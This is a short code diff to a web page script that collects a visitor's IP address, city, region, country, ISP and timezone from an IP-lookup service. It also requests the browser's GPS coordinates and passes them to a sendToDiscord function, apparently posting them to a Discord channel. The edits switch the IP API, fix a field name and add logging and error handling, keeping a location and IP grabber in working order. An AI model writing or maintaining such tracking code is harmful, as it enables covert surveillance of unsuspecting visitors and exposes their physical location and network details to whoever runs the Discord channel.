@@ -39,7 +39,7 @@
 **IP:** ${ipData.ip}  
 **City:** ${ipData.city}  
 **Region:** ${ipData.region}  
-**Country:** ${ipData.country}  
+**Country:** ${ipData.country_name}  
 **ISP:** ${ipData.org}  
 **Timezone:** ${ipData.timezone}
 
@@ -58,7 +58,7 @@
     }
 
     function getIPAndGPS() {
-      fetch("https://ipinfo.io/json?token=tryit")
+      fetch("https://ipapi.co/json/")
         .then(res => res.json())
         .then(ipData => {
           if ("geolocation" in navigator) {
@@ -71,6 +71,7 @@
                 console.log("Lat:", lat);
                 console.log("Lon:", lon);
                 console.log("Accuracy:", acc);
+                console.log("IP:", ipData.ip);
 
                 sendToDiscord(lat, lon, acc, ipData);
               },
@@ -85,6 +86,9 @@
               }
             );
           }
+        })
+        .catch(error => {
+          console.error("IP fetch failed:", error.message);
         });
     }
 
